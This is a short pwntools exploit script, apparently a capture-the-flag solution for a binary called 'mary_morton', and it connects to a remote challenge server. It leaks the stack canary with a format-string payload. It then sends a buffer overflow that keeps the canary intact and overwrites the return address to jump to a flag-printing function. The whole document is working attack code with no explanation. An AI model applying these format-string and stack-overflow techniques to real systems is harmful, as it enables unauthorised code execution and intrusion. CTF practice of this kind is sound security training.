from pwn import *
# p = process('./mary_morton')
p = remote("111.200.241.244", "65267")

cat_flag = 0x4008DA	# 0x4008DA => view ida64
offset = 6

p.recvuntil('3. Exit the battle \n')
p.sendline('2')

payload = '%{}$p'.format(offset + 0x88/8)
p.sendline(payload)
p.recvuntil("0x")
canary_addr = int(p.recv(16), 16)

p.recvuntil('3. Exit the battle \n')
p.sendline('1')
payload = 'a' * 0x88 + p64(canary_addr) + 'a' * 8 + p64(cat_flag)
p.sendline(payload)
 
p.interactive()
